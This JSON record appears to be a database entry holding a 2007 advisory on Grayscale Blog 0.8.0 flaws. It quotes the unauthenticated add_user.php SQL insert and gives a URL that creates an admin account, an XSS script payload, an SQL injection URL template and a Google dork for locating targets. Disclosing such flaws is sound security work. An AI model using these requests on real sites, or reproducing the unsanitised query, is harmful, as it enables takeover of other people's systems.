{
  "id": "3447",
  "title": "Grayscale Blog 0.8.0 - Security Bypass / SQL Injection / Cross-Site Scripting",
  "cve": "CVE-2007-1434",
  "vuln_type": "sqli",
  "code": "# Security Advisory - Multiple Vulnerabilities in Grayscale Blog 0.8.0 #\r\n\r\nDate            : 2007-02-24\r\nProduct         : Grayscale Blog\r\nVersion         : 0.8.0 - Prior version maybe also be affected\r\nVendor          : http://sourceforge.net/projects/gsblogger/ - http://www.karlcore.com/programming/blog/\r\n\r\nVendor Status   : 2007-02-24 -> Not Informed!\r\n                  2007-03-02 -> Contacted, waiting reply!\r\n                  2007-03-09 -> Vendor never replyed\r\n\r\nSource          : omnipresent - omni\r\nE-mail          : omnipresent[at]email[dot]it\r\n\r\nGoogle Dork     : \"Powered by Grayscale Blog\"\r\n\r\n\r\nSecurity Issues :\r\n\r\n1.) Security Query Bypass: [TESTED]\r\n\r\nA user can do lots of stuff with some php scripts located in the directory \"/scripts/\", for example:\r\n\r\nadd_user.php - Security Bypass\r\n\r\n// $user_id=$_REQUEST['user_id']; // not used\r\n$user_loginname=$_REQUEST['user_loginname'];\r\n$user_password=$_REQUEST['user_password'];\r\n$user_real_name=$_REQUEST['user_real_name'];\r\n$user_email=$_REQUEST['user_email'];\r\n// $user_date_added=$_REQUEST['user_date_added']; // not used\r\n// $user_lastmod=$_REQUEST['user_lastmod']; // not used\r\n$user_permissions=$_REQUEST['user_permissions'];\r\n$user_added_by=$_REQUEST['user_added_by'];\r\n$user_lastmod_by=$_REQUEST['user_lastmod_by'];\r\n$user_allow=$_REQUEST['user_allow'];\r\n\r\n// define the query\r\n$query = \"INSERT INTO blog_users (user_loginname, user_password, user_real_name, user_email, user_date_added, user_lastmod, user_permissions, user_added_by, user_lastmod_by, user_allow )\r\n           values ('$user_loginname', '$user_password', '$user_real_name', '$user_email', NOW(), NOW(), '$user_permissions', '$user_added_by', '$user_lastmod_by', '$user_allow')\";\r\n\r\nAs you can see the code there are no security restriction for any users!! Everyone can add a user with Administrator Privilege ($user_permissions = 3).\r\n\r\nOther files affected by some security issues, like the above, are:\r\n\r\n-addblog.php\r\n-editblog.php\r\n-editlinks.php\r\n-edit_users.php\r\n-add_links.php\r\n\r\nExample:\r\n\r\nhttp://vulnerable_server/path/scripts/add_users.php?user_loginname=HACK_USER&user_password=HACK_USER&user_real_name=real&user_email=os@so.net&user_permissions=3&user_added_by=1&user_lastmod_by=1&user_allow=1\r\n\r\nAnd you have admin rights!\r\n\r\n2.) XSS Vulnerability: [TESTED]\r\n\r\nSecurity issue in the following files:\r\n\r\n-\"/scripts/addblog_comment.php\" -> variables are not properly sanitized before being used in the query string\r\n-\"detail.php\" -> variables are not properly sanitized before being used in the query string (query2 -> blog_comments)\r\n\r\nExample:\r\n\r\nYou can put in the comment fields the following script:\r\n\r\n<script>alert(\"XSS\")</script>\r\n\r\n\r\n3.) SQL Injection vulnerability: [NOT TESTED]\r\n\r\nIn lots of files variables are not properly sanitized before being used, these files are, for example:\r\n\r\n-userdetail.php -> id variable\r\n-jump.php       -> id variable and url variable for our redirect\r\n-detail.php     -> id variable\r\n\r\nExample:\r\n\r\nhttp://vulnerable_server/path/detail.php?id=1;[SQL INJECTION]\r\n\r\n.:. Patches:\r\n\r\n0x0 No vendor patches released!\r\n0x1 Edit the source code to ensure that input is properly verified.\r\n\r\n# milw0rm.com [2007-03-09]",
  "url": "https://www.exploit-db.com/exploits/3447"
}